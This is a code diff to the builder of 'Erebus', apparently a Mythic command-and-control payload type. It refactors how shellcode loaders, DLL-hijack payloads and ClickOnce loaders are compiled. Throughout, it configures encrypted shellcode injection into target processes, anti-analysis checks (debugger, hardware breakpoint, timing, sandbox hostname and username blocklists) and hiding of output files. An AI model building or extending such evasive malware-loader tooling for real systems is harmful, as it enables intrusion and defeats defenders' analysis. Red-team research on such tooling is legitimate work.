-                elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
-                    payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
-                    payload_path = str(payload_path)
-
+                elif loader_type == "ClickOnce":
                     # ===== Configure ClickOnce InjectionConfig.cs =====
-                    injection_config_template_path = PurePath(agent_build_path) / "templates" / "InjectionConfig.cs"
-                    injection_config_template_path = str(injection_config_template_path)
                     injection_config_destination = PurePath(clickonce_loader_path) / "InjectionConfig.cs"
                     injection_config_destination = str(injection_config_destination)
 
                     try:
-                        encryption_key_bytes = ""
-                        encrypted_shellcode_bytes = ""
+                        encryption_key_bytes_clickonce = ""
+                        encrypted_shellcode_bytes_clickonce = ""
                         if os.path.exists(encrypted_shellcode_path_sc):
                             try:
                                 with open(encrypted_shellcode_path_sc, "r") as combined_file:
@@ -1944,8 +2006,8 @@ generated if none have been entered.""",
                                         key_section = key_match.group(1)
                                         hex_key = re.findall(r'0x[0-9a-fA-F]{2}', key_section)
                                         if hex_key:
-                                            encryption_key_bytes = ", ".join(hex_key)
-                                            output += f"[DEBUG] Extracted encryption key bytes: {encryption_key_bytes}\n"
+                                            encryption_key_bytes_clickonce = ", ".join(hex_key)
+                                            output += f"[DEBUG] Extracted encryption key bytes: {encryption_key_bytes_clickonce}\n"
                                         else:
                                             output += f"[DEBUG] No hex values found in key section: {key_section[:100]}\n"
                                     else:
@@ -1958,7 +2020,7 @@ generated if none have been entered.""",
                                         shellcode_section = shellcode_match.group(1)
                                         hex_shellcode = re.findall(r'0x[0-9a-fA-F]{2}', shellcode_section)
                                         if hex_shellcode:
-                                            encrypted_shellcode_bytes = ", ".join(hex_shellcode)
+                                            encrypted_shellcode_bytes_clickonce = ", ".join(hex_shellcode)
                                             output += f"[DEBUG] Extracted shellcode bytes (count: {len(hex_shellcode)})\n"
                                         else:
                                             output += f"[DEBUG] No hex values found in shellcode section: {shellcode_section[:100]}\n"
@@ -1973,14 +2035,39 @@ generated if none have been entered.""",
                         injection_config_template = environment.get_template("InjectionConfig.cs")
                         compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                         encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
+                        
+                        # Helper function to convert array to C# string format
+                        def array_to_csharp_string(lst):
+                            if not lst or len(lst) == 0:
+                                return ""
+                            return ", ".join(f'"{item}"' for item in lst)
+                        
+                        # Guardrails configuration for ClickOnce
+                        guardrails_enabled = 1 if self.get_parameter("0.5a Enable Guardrails") else 0
+                        guardrails_check_debugger = 1 if self.get_parameter("0.5b Check IsDebuggerPresent") else 0
+                        guardrails_check_processes = 1 if self.get_parameter("0.5d Check Debugger Processes") else 0
+                        guardrails_check_hwbp = 1 if self.get_parameter("0.5e Check Hardware Breakpoints") else 0
+                        guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0
+
                         injection_config_data = {
                             "COMPRESSION_TYPE": compression_type_value,
                             "ENCODING_TYPE": encoding_type_value,
                             "ENCRYPTION_TYPE": encryption_type_value,
                             "INJECTION_METHOD": self.get_parameter("0.6 ClickOnce - Injection Method"),
                             "TARGET_PROCESS": self.get_parameter("0.7 ClickOnce - Target Process"),
-                            "ENCRYPTION_KEY": encryption_key_bytes,
-                            "ENCRYPTION_SHELLCODE": encrypted_shellcode_bytes
+                            "ENCRYPTION_KEY": encryption_key_bytes_clickonce,
+                            "ENCRYPTION_SHELLCODE": encrypted_shellcode_bytes_clickonce,
+                            "GUARDRAILS_ENABLED": "true" if guardrails_enabled else "false",
+                            "GUARDRAILS_CHECK_DEBUGGER": "true" if guardrails_check_debugger else "false",
+                            "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": "true" if guardrails_check_processes else "false",
+                            "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": "true" if guardrails_check_hwbp else "false",
+                            "GUARDRAILS_CHECK_TIMING": "true" if guardrails_check_timing else "false",
+                            "ALLOWED_HOSTNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5g Hostname Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
+                            "BLOCKED_HOSTNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5h Block Analysis Hostnames")) if self.get_parameter("0.5a Enable Guardrails") else []),
+                            "BLOCKED_USERNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5i Block Analysis Usernames")) if self.get_parameter("0.5a Enable Guardrails") else []),
+                            "ALLOWED_IPS": array_to_csharp_string(parse_csv(self.get_parameter("0.5j IP Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
+                            "BLOCKED_IPS": array_to_csharp_string(parse_csv(self.get_parameter("0.5k IP Blacklist")) if self.get_parameter("0.5a Enable Guardrails") else []),
+                            "ALLOWED_DOMAINS": array_to_csharp_string(parse_csv(self.get_parameter("0.5l Domain Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                         }
                         rendered_injection_config = injection_config_template.render(**injection_config_data)
 
@@ -2008,8 +2095,87 @@ generated if none have been entered.""",
                         ))
                         return response
 
-                    # Compile ClickOnce Loader using Makefile
-                    # Makefile target "publish" automatically handles build, cleanup, and verification
+            # ===== Configure & Compile Payload (Unified for all types) =====
+            # Parse CSV helper function (used for guardrails)
+            def parse_csv(value):
+                if not value or not isinstance(value, str):
+                    return []
+                return [item.strip() for item in value.split(',') if item.strip()]
+
+            # Configure guadrails if applicable
+            if payload_type == "Hijack":
+                guardrail_template = environment.get_template("guardrail.hpp")
+                guardrails_enabled = self.get_parameter("1.1 Use Built-in Guardrails")
+                guardrail_data = {
+                    "check_debugger": self.get_parameter("1.1a Check IsDebuggerPresent") if guardrails_enabled else False,
+                    "check_remote_debugger": self.get_parameter("1.1b Check Remote Debugger") if guardrails_enabled else False,
+                    "check_debugger_processes": self.get_parameter("1.1c Check Debugger Processes") if guardrails_enabled else False,
+                    "check_hardware_breakpoints": self.get_parameter("1.1d Check Hardware Breakpoints") if guardrails_enabled else False,
+                    "check_timing": self.get_parameter("1.1e Check Timing Anomalies") if guardrails_enabled else False,
+                    "allowed_hostnames": parse_csv(self.get_parameter("1.1f Hostname Whitelist")) if guardrails_enabled else [],
+                    "blocked_hostnames": parse_csv(self.get_parameter("1.1g Block Analysis Hostnames")) if guardrails_enabled else [],
+                    "blocked_usernames": parse_csv(self.get_parameter("1.1h Block Analysis Usernames")) if guardrails_enabled else [],
+                    "allowed_ips": parse_csv(self.get_parameter("1.1i IP Whitelist")) if guardrails_enabled else [],
+                    "blocked_ips": parse_csv(self.get_parameter("1.1j IP Blacklist")) if guardrails_enabled else [],
+                    "allowed_domains": parse_csv(self.get_parameter("1.1k Domain Whitelist")) if guardrails_enabled else [],
+                }
+                guardrail_output = guardrail_template.render(**guardrail_data)
+                guardrail_hpp_path = PurePath(agent_build_path) / "templates" / "guardrail.hpp"
+                with open(str(guardrail_hpp_path), "w") as file:
+                    file.write(guardrail_output)
+
+                # DLL Hijack compilation
+                cmd = [
+                    "make",
+                    "-C",
+                    shellcode_loader_path,
+                    f"BUILD={self.get_parameter('0.3 Loader Build Configuration')}",
+                    "TARGET=dll",
+                    "all"
+                ]
+                compile_step_name = "[T1027.011] - Compiling DLL Payload"
+                compile_step_msg = "DLL Loader Compiled!"
+                payload_output_file = f"{shellcode_loader_path}/erebus.dll"
+                payload_final_name = dll_file_name  # Use the actual DLL filename
+
+            elif payload_type == "Loader":
+                loader_type = self.get_parameter("0.1 Loader Type")
+                
+                if loader_type == "Shellcode Loader":
+                    # Configure guardrails for Shellcode Loader
+                    guardrail_template = environment.get_template("guardrail.hpp")
+                    guardrails_enabled = self.get_parameter("0.5a Enable Guardrails")
+                    guardrail_data = {
+                        "check_debugger": self.get_parameter("0.5b Check IsDebuggerPresent") if guardrails_enabled else False,
+                        "check_remote_debugger": self.get_parameter("0.5c Check Remote Debugger") if guardrails_enabled else False,
+                        "check_debugger_processes": self.get_parameter("0.5d Check Debugger Processes") if guardrails_enabled else False,
+                        "check_hardware_breakpoints": self.get_parameter("0.5e Check Hardware Breakpoints") if guardrails_enabled else False,
+                        "check_timing": self.get_parameter("0.5f Check Timing Anomalies") if guardrails_enabled else False,
+                        "allowed_hostnames": parse_csv(self.get_parameter("0.5g Hostname Whitelist")) if guardrails_enabled else [],
+                        "blocked_hostnames": parse_csv(self.get_parameter("0.5h Block Analysis Hostnames")) if guardrails_enabled else [],
+                        "blocked_usernames": parse_csv(self.get_parameter("0.5i Block Analysis Usernames")) if guardrails_enabled else [],
+                        "allowed_ips": parse_csv(self.get_parameter("0.5j IP Whitelist")) if guardrails_enabled else [],
+                        "blocked_ips": parse_csv(self.get_parameter("0.5k IP Blacklist")) if guardrails_enabled else [],
+                        "allowed_domains": parse_csv(self.get_parameter("0.5l Domain Whitelist")) if guardrails_enabled else [],
+                    }
+                    guardrail_output = guardrail_template.render(**guardrail_data)
+                    guardrail_hpp_path = PurePath(shellcode_loader_path) / "include" / "guardrail.hpp"
+                    with open(str(guardrail_hpp_path), "w") as file:
+                        file.write(guardrail_output)
+
+                    cmd = [
+                        "make",
+                        "-C",
+                        shellcode_loader_path,
+                        f"BUILD={self.get_parameter('0.3 Loader Build Configuration')}",
+                        "all"
+                    ]
+                    compile_step_name = "[T1027] - Compiling Shellcode Loader"
+                    compile_step_msg = "Shellcode Loader Compiled!"
+                    payload_output_file = f"{shellcode_loader_path}/erebus.exe"
+                    payload_final_name = "erebus.exe"
+
+                elif loader_type == "ClickOnce":
                     build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
                     rid = self.get_parameter('0.4 ClickOnce RID') or "win-x64"
 
@@ -2021,19 +2187,88 @@ generated if none have been entered.""",
                         f"RID={rid}",
                         "publish"
                     ]
+                    compile_step_name = "[T1027] - Compiling ClickOnce Loader"
+                    compile_step_msg = "ClickOnce Loader Compiled!"
+                    payload_output_file = None  # Will be determined from publish directory
+                    payload_final_name = "erebus.exe"
 
-                    process = await asyncio.create_subprocess_exec(
-                        *cmd,
-                        stdout=asyncio.subprocess.PIPE,
-                        stderr=asyncio.subprocess.PIPE,
-                    )
-                    stdout, stderr = await process.communicate()
+            # Execute compilation
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            stdout, stderr = await process.communicate()
 
-                    if stdout:
-                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
-                    if stderr:
-                        output += f"[stderr]\n{stderr.decode(errors='replace')}"
+            if stdout:
+                output += f"[stdout]\n{stdout.decode(errors='replace')}"
+            if stderr:
+                output += f"[stderr]\n{stderr.decode(errors='replace')}"
 
+            # Handle compilation output
+            if payload_type == "Hijack":
+                payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                payload_path = str(payload_path)
+                shutil.copy(dst=payload_path, src=payload_output_file)
+
+                if os.path.exists(payload_path):
+                    response.status = BuildStatus.Success
+                    response.build_message = "DLL Compiled!"
+                    response.build_stdout = output + "\n" + payload_path
+                    await SendMythicRPCPayloadUpdatebuildStep(
+                        MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName=compile_step_name,
+                        StepStdout=compile_step_msg,
+                        StepSuccess=True,
+                    ))
+                else:
+                    response.status = BuildStatus.Error
+                    response.payload = b""
+                    response.build_message = "Failed to compile DLL"
+                    response.build_stderr = output + "\n" + payload_path
+                    await SendMythicRPCPayloadUpdatebuildStep(
+                        MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName=compile_step_name,
+                        StepStdout="Failed to Compile DLL Payload",
+                        StepSuccess=False,
+                    ))
+                    return response
+
+            elif payload_type == "Loader":
+                loader_type = self.get_parameter("0.1 Loader Type")
+                
+                if loader_type == "Shellcode Loader":
+                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                    payload_path = str(payload_path)
+                    shutil.copy(dst=payload_path, src=payload_output_file)
+
+                    if os.path.exists(payload_path):
+                        response.status = BuildStatus.Success
+                        response.build_message = "Loader Compiled!"
+                        response.build_stdout = output + "\n" + payload_path
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName=compile_step_name,
+                            StepStdout=compile_step_msg,
+                            StepSuccess=True,
+                        ))
+                    else:
+                        response.status = BuildStatus.Error
+                        response.build_message = "Failed to compile loader"
+                        response.build_stderr = output + "\n" + payload_path
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName=compile_step_name,
+                            StepStdout="Failed to Compile Shellcode Loader",
+                            StepSuccess=False,
+                        ))
+                        return response
+
+                elif loader_type == "ClickOnce":
                     if process.returncode != 0:
                         response.status = BuildStatus.Error
                         response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
@@ -2041,22 +2276,20 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="[T1027] - Compiling ClickOnce Loader",
+                            StepName=compile_step_name,
                             StepStdout=f"Makefile publish failed",
                             StepSuccess=False,
                         ))
                         return response
 
-                    # Locate publish output: bin/{config}/{tfm}/{rid}/publish
-                    # Makefile ensures cleanup happens, so all remaining files are needed
+                    # Locate publish output
+                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
                     publish_root = Path(clickonce_loader_path) / "bin" / build_config
 
                     publish_dir = None
                     if publish_root.exists():
-                        # Traverse: CONFIG/TFM/RID/publish
                         for tfm_dir in publish_root.iterdir():
                             if tfm_dir.is_dir() and "net" in tfm_dir.name and "-windows" in tfm_dir.name:
-                                # Found TFM directory (e.g., net7.0-windows)
                                 for rid_dir in tfm_dir.iterdir():
                                     if rid_dir.is_dir():
                                         candidate = rid_dir / "publish"
@@ -2073,23 +2306,20 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="[T1027] - Compiling ClickOnce Loader",
+                            StepName=compile_step_name,
                             StepStdout="Failed to locate ClickOnce publish output",
                             StepSuccess=False,
                         ))
                         return response
 
-                    # Copy cleaned artifacts from publish directory to payload directory
-                    # Makefile cleanup removes debug symbols and unnecessary runtime files
+                    # Copy cleaned artifacts from publish directory
                     payload_dir = Path(agent_build_path) / "payload"
                     payload_dir.mkdir(parents=True, exist_ok=True)
 
-                    # Copy all files from publish directory (already cleaned by Makefile)
                     for item in publish_dir.iterdir():
                         if item.is_file():
                             dest_path = payload_dir / item.name
                             shutil.copy2(str(item), str(dest_path))
-                            # Try to hide files on Windows
                             try:
                                 import ctypes
                                 FILE_ATTRIBUTE_HIDDEN = 0x02
@@ -2097,24 +2327,24 @@ generated if none have been entered.""",
                             except:
                                 pass
 
-                    # Log available files after cleanup
                     output += f"[DEBUG] Cleaned publish artifacts:\n"
                     for item in publish_dir.iterdir():
                         if item.is_file():
                             output += f"  - {item.name} ({item.stat().st_size} bytes)\n"
 
-                    # Locate main executable (Makefile ensures it exists)
+                    # Locate and copy main executable
+                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                    payload_path = str(payload_path)
+                    
                     clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
                     clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"
 
                     if clickonce_exe.exists():
-                        # Copy exe as primary payload
                         shutil.copy2(str(clickonce_exe), str(payload_path))
                         response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path}"
                         response.status = BuildStatus.Success
                         response.build_message = "ClickOnce Loader compiled successfully!"
                     elif clickonce_dll.exists():
-                        # Fallback to DLL if exe not present
                         payload_path_dll = Path(payload_path).with_suffix(".dll")
                         shutil.copy2(str(clickonce_dll), str(payload_path_dll))
                         response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path_dll}"
@@ -2127,21 +2357,22 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="[T1027] - Compiling ClickOnce Loader",
+                            StepName=compile_step_name,
                             StepStdout="Failed to locate executable",
                             StepSuccess=False,
                         ))
                         return response
+
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="[T1027] - Compiling ClickOnce Loader",
-                        StepStdout="ClickOnce Loader Compiled!",
+                        StepName=compile_step_name,
+                        StepStdout=compile_step_msg,
                         StepSuccess=True,
                     ))
-                    output = ""
 
-            ######################### End Of Shellcode Loader Section #########################
+            output = ""
+            ######################### End Of Payload Build Section #########################
             ######################### Code Signing Section #########################
             if self.get_parameter("6.0 Codesign Loader"):
                 try:
@@ -2429,7 +2660,7 @@ generated if none have been entered.""",
 
                         # Generate XLL shellcode using shellcrypt
                         output += "[*] Processing shellcode for XLL injection...\n"
-                        
+
                         shellcrypt_cmd = [
                             "python",
                             shellcrypt_path,
@@ -2715,7 +2946,7 @@ static size_t key_len = sizeof(key);
                                 # Capture both stdout and stderr for debugging
                                 if result.stdout:
                                     output += f"[DEBUG] Make stdout:\n{result.stdout}\n"
-                                
+
                                 if result.stderr:
                                     output += f"[DEBUG] Make stderr:\n{result.stderr}\n"
 
@@ -2731,7 +2962,7 @@ static size_t key_len = sizeof(key);
                                     output += f"[!] Make compilation returned non-zero exit code: {result.returncode}\n"
                                     if result.stderr:
                                         output += f"[ERROR] Make stderr:\n{result.stderr}\n"
-                                    
+
                                     # Debug: Check what files exist in the temp build directory
                                     output += f"[DEBUG] Files in temp build directory:\n"
                                     try:
@@ -2742,7 +2973,7 @@ static size_t key_len = sizeof(key);
                                             output += f"  [!] Temp build directory does not exist: {xll_build_dir}\n"
                                     except Exception as e:
                                         output += f"  [!] Error listing directory: {str(e)}\n"
-                                    
+
                                     # Debug: Check SDK availability
                                     output += f"[DEBUG] SDK status:\n"
                                     if sdk_dir.exists():
